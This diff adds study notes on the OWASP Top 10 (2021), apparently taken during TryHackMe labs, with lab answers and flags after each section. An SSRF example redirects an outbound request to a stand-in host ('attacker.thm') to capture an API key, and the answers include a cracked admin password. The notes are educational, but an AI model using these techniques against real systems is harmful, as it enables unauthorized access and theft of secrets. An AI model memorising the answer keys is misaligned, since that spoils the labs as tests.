@@ -1230,3 +1230,371 @@ Fix HTTPS/TLS certificate errors caused by Burp’s interception of encrypted tr
     - Check **“Trust this CA to identify websites”**.
     - Click **OK** to confirm.
 
+
+# OWASP Top 10 - 2021
+
+![[mapping.png]]
+
+## 1. Broken Access Control 
+
+Broken Access Control occurs when a website fails to properly restrict access to certain pages or functionalities, allowing unauthorized users to view or perform actions meant only for specific roles (e.g., admin).
+### Consequences
+
+- Unauthorized users can:
+    
+    - View **sensitive information** belonging to others.
+    - **Access restricted functionalities** (like user management or admin panels).
+### Impact
+
+- Attackers can **bypass authorization** mechanisms.
+- Leads to **data exposure** or **privilege escalation**.
+
+### Real-World Example (2019)
+
+- A vulnerability in **YouTube** allowed attackers to retrieve individual frames from **private videos**.
+- By requesting multiple frames, the attacker could partially **reconstruct** the private video.
+- This violated the user’s expectation of privacy → **Broken Access Control vulnerability**.
+
+## IDOR Challenge 
+
+- IDOR (Insecure Direct Object Reference) is an **access control vulnerability** where attackers can access unauthorized resources by **manipulating direct object references** (like IDs or file names).
+### Cause
+
+- Occurs when an application exposes internal object identifiers (e.g., `id`, `file`, `user`) **without verifying ownership or permissions**.
+### Example
+
+- URL: `https://bank.thm/account?id=111111` → shows user’s account.
+- Attacker changes it to `id=222222` → accesses another user’s data if no validation is enforced.
+### Key Point
+
+- The issue isn’t the direct reference itself, but **the lack of authorization checks** to confirm that the logged-in user owns or has rights to the referenced object.
+### Impact
+
+- Unauthorized data exposure (e.g., user info, financial records).
+- Possible account takeover or data modification.
+
+Q: Look at other user's notes. What is the flag ? 
+A: flag{fivefourthree}
+
+## 2.  Cryptographic Failures 
+
+Cryptographic failures occur when cryptography is misused, poorly implemented, or omitted—leading to exposure of sensitive data.
+
+### Why it matters
+
+- Protects **data in transit** (e.g., HTTPS/TLS) and **data at rest** (e.g., encrypted DB fields/files).
+- Failures enable eavesdropping, data theft, replay/MITM attacks, or direct leakage from servers.
+### Common scenarios
+
+- **Missing or weak TLS** → attackers can read or tamper network traffic.
+- **Sensitive data stored unencrypted or with weak algorithms** → attacker who obtains backups or DB files can read data.
+- **Improper key management** or hardcoded keys/tokens in code.
+- **Using reversible or fast hashes for passwords** (no salted slow hashing) — easy to crack.
+### Flat-file DBs (SQLite) — risk context
+
+- Small apps may use **flat-file DBs** (e.g., SQLite) stored as files.
+- If database files are placed under the web root or otherwise accessible, an attacker can download them and extract all contained data.
+    
+### Quick SQLite investigative steps (command line)
+
+1. Check file type: `file example.db`    
+2. Open DB: `sqlite3 example.db`
+3. List tables: `.tables`
+4. Show table schema: `PRAGMA table_info(table_name);`
+5. Dump rows: `SELECT * FROM table_name;`
+
+Q: What is the name of the mentioned directory ? 
+A: /assets
+
+Q: Navigate to the directory you found in question one. what file stands out as being likely to contain sensitive data ? 
+A: webapp.db
+
+Q: Use the supporting material to access the sensitive data. What is the password hash of the admin user ? 
+A: 6eea9b7ef19179a06954edd0f6c05ceb
+
+Q: Crack the hash. What is the admin's plaintext password ? 
+A: qwertyuiop
+
+Q: Log in as the admin. What is the flag ? 
+A: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
+
+## 3. Injection 
+
+- Injection flaws occur when an application treats **user input as code/commands**, allowing attackers to change the intended behaviour (e.g., SQL injection, command injection).
+
+- **Common types:**
+    
+    - **SQL Injection:** user input injected into database queries.
+    - **Command Injection:** user input passed to OS/shell commands.
+        
+- **Root cause:**  
+    Unsanitised user-controlled input concatenated into commands/queries (the app trusts client data and does not enforce authorization or safe handling).
+    
+- **Illustrative (high-level) example:**  
+    A web app that builds a shell call using two user parameters and executes it on the server is dangerous — if an attacker can inject shell syntax, they can make the server execute arbitrary commands.
+    
+- **Why it’s bad:**  
+    Attackers can read/modify/delete data, execute arbitrary OS commands, escalate access, or pivot inside the network.
+    
+- **Exploitation vector (conceptual):**  
+    Shell features that evaluate expressions or nested commands can be abused to run attacker-supplied commands when input is embedded directly into a shell call.
+    
+- **Mitigations / best practices:**
+    
+    - **Never pass raw user input into shell or query strings.**
+    - Use **allow-lists** (valid input sets) rather than blacklists.
+    - Use **parameterized queries** for databases (prepared statements).
+    - Use safe APIs that accept argument arrays (avoid shell evaluation).
+    - **Escape or validate** inputs strictly when external commands are unavoidable.
+    - **Disable or avoid** dangerous functions (system/passthru/etc.) where possible.
+    - Apply **least privilege** to application processes and isolate execution.
+    - Implement **logging, monitoring, and input size limits** to detect abuse.
+
+Q: What strange text file is in the website's root directory ? 
+A: drepper.txt 
+
+Q: How many non-root/non-service/non-daemon users are there ? 
+A: 0 
+
+Q: What user is this app running as ? 
+A: apache 
+
+Q: What is the user's shell set as ? 
+A: /sbin/nologin 
+
+Q: What version of Alpine Linux is running ? 
+A: 3.16.0
+
+
+## 4. Insecure Design 
+
+- Insecure design refers to **security flaws in the architecture or logic** of an application — vulnerabilities that arise from poor planning or missing security considerations during the **design phase**, not from faulty implementation.
+    
+- **Root cause:**
+    
+    - **Lack of proper threat modelling** during system design.
+    - **Assumptions** about user behaviour or attacker capability.
+    - Developers introducing **shortcuts** (e.g., disabling security checks for testing) and forgetting to restore them.
+        
+- **Example – Instagram Password Reset Flaw:**
+    
+    - Instagram used a **6-digit SMS code** for password reset.
+    - Implemented **rate limiting** (250 attempts per IP).
+    - **Design flaw:** Rate limiting was based only on IP address.
+    - Attackers could use **multiple IPs (via cloud servers)** to bypass rate limiting and brute-force the code.
+    - Vulnerability existed in **system logic**, not implementation — the assumption that users wouldn’t control many IPs was wrong.
+        
+- **Impact:**
+    
+    - Can lead to large-scale exploitation even when code seems correct.
+    - Typically **requires redesigning the system or feature** to fix (e.g., centralizing rate limits, introducing account-based limits).
+        
+- **Mitigation / Best Practices:**
+    
+    - **Perform Threat Modelling** early in development (identify possible abuse cases).
+    - Apply **Secure Software Development Lifecycle (SSDLC)** principles.
+    - Avoid hard-coded assumptions about attacker capabilities.
+    - Use **centralized security controls** for critical functions (auth, rate limiting).
+    - Enforce **defense-in-depth** (multiple security layers).
+    - Regularly review **security design** before release and after major updates.
+
+Q: What is the value of the flag in joseph's account ? 
+A: THM{Not_3ven_c4tz_c0uld_sav3_U!}
+
+## 5. Security Misconfiguration 
+
+- Security misconfigurations happen when security settings are incorrectly set or left at insecure defaults.
+- Even updated software can be vulnerable if poorly configured.
+
+**Examples:**
+
+- Misconfigured cloud permissions (e.g., public S3 buckets).
+- Unnecessary services, pages, or accounts enabled.
+- Default accounts with unchanged passwords.
+- Detailed error messages revealing system info.
+- Missing HTTP security headers.
+
+**Impact:**
+
+- Can lead to further vulnerabilities like default credential access, XXE, or command injection.
+
+**Debugging Interfaces:**
+
+- Debugging features left enabled in production can be exploited.
+- Frameworks often include debug consoles for development.
+- If exposed, attackers can execute arbitrary code on the server.
+
+**Example:**
+
+- Patreon (2015) hack due to exposed Werkzeug debug console, allowing remote code execution.
+    
+
+**Prevention:**
+
+- Disable debugging in production.
+- Apply proper permissions and secure configurations.
+- Limit features, services, and privileges to only what’s necessary.
+- Use security headers and hide detailed error information.
+
+Q: What is the database file name (the one with the .db extension) in the current directory ? 
+A: todo.db
+
+Q: Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code ? 
+A: THM{Just_a_tiny_misconfiguration}
+
+## 6. Vulnerable and Outdated Components 
+
+- Occurs when organizations use outdated software with known vulnerabilities.
+- **Example**: Using an old version of WordPress (e.g., 4.6) that has a known unauthenticated remote code execution (RCE) vulnerability.
+- Attackers can easily exploit such vulnerabilities using publicly available tools or exploits (e.g., found on Exploit-DB).
+- These vulnerabilities are dangerous because:
+    
+    - They are **well-documented** and **easy to exploit**.
+    - Attackers can compromise systems with minimal effort.
+        
+- Even missing a **single software update** can expose systems to multiple attacks.
+
+Q: What is the content of the /opt/flag.txt file ? 
+A: THM{But_1ts_n0t_my_f4ult!}
+
+## 7. Identification and Authentication Failures 
+
+- Authentication verifies user identity; session management maintains state using cookies since HTTP(S) is stateless.
+- **Risk:** Flaws in authentication allow attackers to gain unauthorized access to user accounts and sensitive data.
+
+### Common Issues:
+
+- **Brute Force Attacks:** Attackers try multiple username-password combinations.
+- **Weak Credentials:** Allowing simple or common passwords (e.g., "password1").
+- **Weak Session Cookies:** Predictable or easily guessable session values let attackers hijack sessions.
+
+### Mitigations:
+
+- Enforce **strong password policies**.
+- Implement **account lockout** after several failed login attempts.
+- Use **Multi-Factor Authentication (MFA)** for additional security layers.
+
+Q: What is the flag you found in darren's account ? 
+A: fe86079416a21a3c99937fea8874b667
+
+Q: What is the flag that you found in arthur's account ? 
+A: d9ac0f7db4fda460ac3edeb75d75e16e
+
+## 8. Software and Data Integrity Failures 
+
+Integrity = confidence that data or software hasn't been changed (maliciously or accidentally).
+
+**Quick checklist to protect & verify integrity**
+
+- **Files/downloads:** Always verify a published hash (prefer SHA-256 or stronger).  
+    Example commands:  
+    `sha256sum file.bin` → compare to the vendor’s published SHA-256.
+
+- **Third-party resources (JS/CSS):** Use **Subresource Integrity (SRI)** + HTTPS + `crossorigin`.  
+    Example:  
+    `<script src="https://example.com/lib.js" integrity="sha256-<BASE64_HASH>" crossorigin="anonymous"></script>`
+    
+- **Session data / client-stored values:** **Never trust client data.** Keep authoritative state server-side or use **signed** tokens.
+    
+- **JWTs:** Sign tokens with a secure algorithm and secret/key (HMAC or, preferably, asymmetric signing). **Reject tokens with `alg: none`** and always verify the signature and `exp`/`iat` claims.
+![[11c86acaea05f98045cec5634e03e997.png]]
+
+    
+- **Supply-chain:** Pin versions, verify checksums for packages, and prefer package registries that support signing (or use provenance tooling).
+    
+- **Defenses in depth:** key rotation, monitoring for unexpected changes, and keep libraries up to date.
+
+Q: What's is the SHA-256 of https://code.jquery.com/jquery-1.12.4.min.js ? 
+A: sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
+
+Q: Try logging into the application as guest. What is quest's account password ? 
+A: guest 
+
+Q: What is the name of the website's cookie containing a JWT token  ?
+A: jwt-session 
+
+Q: What is the flag presented to the admin user ? 
+A: THM{Dont_take_cookies_from_strangers}
+
+## 9. Security Logging and Monitoring Failures 
+
+Logging tracks every user and system action to **detect, analyze, and respond** to security incidents. Without it, attacks can go unnoticed and untraceable.
+
+### Why Logging Matters
+
+- **Incident response:** Traces attacker actions after a breach.
+- **Regulatory compliance:** Prevents fines by proving what happened.
+- **Threat detection:** Helps spot unusual or malicious behavior early.
+    
+###  What to Log
+
+Include key data in every log entry:
+
+- **Timestamps** (accurate & synchronized)
+- **Usernames / session IDs**
+- **IP addresses & geolocation**
+- **HTTP status codes**
+- **Visited pages / API endpoints**
+
+ **Protect logs:**
+
+- Store securely (encrypt + access control).
+- Keep **redundant backups** in separate locations.
+
+### Monitoring Suspicious Activity
+
+Common red flags:
+
+- Repeated **failed logins** or access to restricted areas.
+- **Anomalous IPs or geolocations** (possible account takeover).
+- Signs of **automation** (rapid or tool-based requests).
+- **Known payloads** (SQLi, XSS patterns, etc.).
+
+### Response & Alerting
+
+- Assign **impact levels** (low, medium, high).
+- **Automate alerts** for high-impact or repeated suspicious activity.
+- Use **SIEM tools** (e.g., Splunk, ELK, Graylog) to collect and analyze logs.
+- Review logs **regularly** — prevention is better than post-incident analysis.
+
+Q: What IP is the attacker using ? 
+A: 49.99.33.16 
+
+Q: What kind of attack is being carried out ?
+A: Brute Force 
+
+## 10. Server Side Request Forgery 
+
+- **Definition:** SSRF — attacker forces a web application to send requests on the attacker’s behalf to arbitrary destinations, controlling the request contents.
+    
+- **Typical origin:** occurs when an application makes outbound requests to third-party services using user-controllable parameters.
+    
+- **Vulnerable pattern (from text):** app exposes a `server` parameter used to build outbound request to an external API (e.g., SMS provider).
+    
+- **Attack flow (example):**
+    
+    - Legitimate: app calls SMS provider `https://sms-provider/api/send?msg=...&key=<API_KEY>`.
+        
+    - Attacker requests: `https://www.mysite.com/sms?server=attacker.thm&msg=ABC`.
+        
+    - App then requests: `https://attacker.thm/api/send?msg=ABC` — attacker receives API key and message.
+        
+- **Proof-of-concept capture (example):** attacker listens with netcat and observes the forwarded GET request from the server.
+    
+- **Consequences listed:**
+    
+    - Enumerate internal networks (IPs, ports).
+    - Abuse trust relationships to access restricted services.
+    - Interact with non-HTTP services potentially leading to RCE.
+
+Q: Explore the website. What is the only host allowed to access the admin area ?
+A: localhost 
+
+Q: Check the Download Resume button. Where does the server parameter point to ? 
+A: secure-file-storage.com 
+
+Q: Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request ? 
+A: THM{Hello_Im_just_an_API_key}
+
+
+
